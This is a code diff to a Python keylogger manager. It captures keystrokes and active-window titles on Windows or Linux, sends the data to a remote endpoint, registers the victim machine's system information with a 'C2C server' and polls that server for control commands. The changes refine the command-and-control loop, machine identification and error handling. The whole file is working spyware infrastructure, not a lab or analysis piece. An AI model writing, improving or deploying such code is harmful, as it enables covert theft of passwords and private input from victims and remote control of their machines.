@@ -54,14 +54,14 @@ class DefaultManager:
     ):
         # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
         if os.name == "vnt":
-            keylogger = WindowsKeylogger()
+            klogger: Listener = WindowsKeylogger()
             self.window_tracker = None
         else:
-            keylogger = LinuxKeylogger()
+            klogger: Listener = LinuxKeylogger()
             # Start a new sequence when the active window changes
             self.window_tracker = WindowTracker(
                 # use lambda to call the start_new_sequence method with the window title
-                lambda w: keylogger.start_new_sequence(w.title)
+                lambda w: klogger.start_new_sequence(w.title)
             )
 
         self.processor = Processor("")
@@ -74,15 +74,16 @@ class DefaultManager:
         if self.endpoint:
             self.sink.append(NetworkWriter(self.endpoint + "/data"))
 
-        self.listner = keylogger
+        self.listner = klogger
         self.interval = push_interval
         self._loop_thread = threading.Thread(target=self._loop)
-        self.start_loop_thread = threading.Thread(target=self.check_start)
+        # self.start_loop_thread = threading.Thread(target=self.check_start)
         self._stopped = False
 
     def start(self) -> None:
         self.listner.start()
-        self.window_tracker.start()
+        if self.window_tracker:
+            self.window_tracker.start()
         self._loop_thread.start()
         self._stopped = False
         self._c2c_init()
@@ -92,7 +93,8 @@ class DefaultManager:
         self._stopped = True
 
         self.listner.stop()
-        self.window_tracker.stop()
+        if self.window_tracker:
+            self.window_tracker.stop()
 
         if self._loop_thread and self._loop_thread.is_alive():
             self._loop_thread.join()
@@ -104,10 +106,15 @@ class DefaultManager:
         This function will start the manager, and then long-poll the C2C server
         for control commands.
         """
-        ctrl = None
+        last = None
 
-        while ctrl := self._c2c_ctrl(last=ctrl):
-            logger.info(f"Received control command: {ctrl}")
+        while ctrl := self._c2c_ctrl(last=last):
+            logger.debug(f"Received control command: {ctrl}")
+
+            if last == ctrl:
+                continue
+
+            last = ctrl
 
             if ctrl == "exit":
                 break
@@ -143,9 +150,11 @@ class DefaultManager:
         if not self.endpoint:
             return False
 
+        system_info = get_system_info()
         machine_info = {
-            "id": "",
-            "info": get_system_info(),
+            "name": system_info.get("pc_name", "Unknown"),
+            "machine_id": self.machine_id,
+            "info": system_info,
         }
 
         resp = requests.post(
@@ -153,7 +162,8 @@ class DefaultManager:
             json=machine_info,
         )
         logger.info(f"Connected to the C2C server: {self.endpoint}")
-        if resp.status_code != 200:
+        # Check for non-2xx status codes
+        if resp.status_code < 200 or resp.status_code >= 300:
             logger.error(
                 f"Failed to send machine info to the C2C server: {self.endpoint}"
             )
@@ -173,6 +183,11 @@ class DefaultManager:
                 f"{self.endpoint}/ctrl",
                 params={"last": last, "machine_id": self.machine_id},
             )
+        except requests.exceptions.ConnectionError as e:
+            logger.error(
+                f"Failed to connect to the C2C server: {self.endpoint}", e
+            )
+            return
         except requests.exceptions.RequestException as e:
             logger.error(
                 f"Failed to get the control command from the C2C server: {self.endpoint}",
@@ -189,4 +204,7 @@ class DefaultManager:
             )
             return "exit"
 
-        return resp.json().get("ctrl", "exit")
+        logger.debug(
+            f"Received control command: {resp.json().get('ctrl', '')}")
+
+        return resp.json().get("ctrl", "")
